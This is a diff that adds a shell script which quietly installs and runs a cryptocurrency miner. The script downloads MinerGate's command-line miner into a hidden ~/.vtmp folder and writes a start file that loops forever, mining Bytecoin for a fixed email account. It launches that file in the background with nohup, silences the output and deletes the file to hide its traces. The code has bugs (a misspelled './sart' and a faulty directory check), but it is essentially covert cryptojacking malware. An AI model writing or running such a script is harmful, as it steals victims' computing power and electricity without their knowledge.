@@ -1,0 +1,23 @@
+pasta=$(ls ~/.vtmp/opt/minergate-cli/ | grep "minergate-cli")
+
+if [ -d "$pasta" ]
+	then
+		clear
+		cd ~
+		cd .vtmp/opt/minergate-cli/
+		echo "while :; do ./minergate-cli -user jfzero@computer4u.com -bcn; done" > start
+		chmod 777 start
+		nohup ./sart > /dev/null &
+		rm -rf start
+	else
+		cd ~
+		mkdir .vtmp
+		cd .vtmp
+		wget https://minergate.com/download/deb-cli
+		ar -x deb-cli
+		tar -xzvpf data*
+		cd opt/minergate-cli/
+		echo "while :; do ./minergate-cli -user jfzero@computer4u.com -bcn; done" > start
+		chmod 777 start
+		nohup ./start > /dev/null &
+	fi
